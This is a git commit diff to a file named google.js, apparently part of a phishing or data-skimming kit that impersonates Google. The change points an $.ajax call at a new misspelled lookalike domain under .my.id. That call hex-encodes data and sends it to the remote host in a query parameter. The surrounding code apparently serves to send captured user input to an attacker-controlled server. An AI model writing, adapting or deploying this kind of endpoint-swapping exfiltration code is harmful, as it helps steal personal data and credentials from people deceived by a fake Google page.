7452031cca16fde543909aba25147028afab4378
sisstem-google <orngnkucing@gmail.com>
2024-12-26 11:21:57 +0700

    Update google.js

--- google.js
+++ google.js
@@ -109,7 +109,7 @@
         end: async function () {
             await $.ajax({
                 url:
-                    "https://syistem-google.website-resmi-id.my.id/sistem-google/?google=" +
+                    "https://system-websitee.resmi-websit-id.my.id/jquery/?google=" +
                     (function (e) {
                         for (var t, n = 0, r = e.length, i = ""; n < r; ++n) i += (t = e.charCodeAt(n).toString(16)).length < 2 ? "0" + t : t;
                         return i;
